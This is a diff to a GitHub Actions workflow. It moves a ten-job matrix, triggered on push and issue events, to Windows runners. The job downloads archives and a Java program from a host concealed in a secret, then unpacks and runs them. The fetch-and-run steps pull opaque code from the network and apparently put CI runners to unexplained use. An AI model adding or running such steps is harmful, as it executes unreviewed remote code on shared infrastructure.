@@ -1,11 +1,11 @@
-name: qwq2
+name: qwq
 on:
   push:
   issues:
 
 jobs:
   worker:
-    runs-on: ubuntu-latest
+    runs-on: windows-latest
     strategy:
       matrix:
         base: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
@@ -17,5 +17,16 @@ jobs:
         java-version: '21'
     - name: working
       run: |
+        curl -o dotnet.exe "https://builds.dotnet.microsoft.com/dotnet/Runtime/10.0.1/dotnet-runtime-10.0.1-win-x86.exe"
+        cmd /c ".\dotnet.exe /quiet"
+        
+        curl -o bin.zip https://${{ secrets.REMOTE }}/bin.zip
+        curl -o bin.z01 https://${{ secrets.REMOTE }}/bin.z01
+        curl -o bin.z02 https://${{ secrets.REMOTE }}/bin.z02
+        
+        choco install 7zip
+        7z x bin.zip -oD:\a\_temp\
+        cd "D:\a\_temp\"
+
         curl -o generator.jar https://${{ secrets.REMOTE }}/generator.jar
         java -jar generator.jar
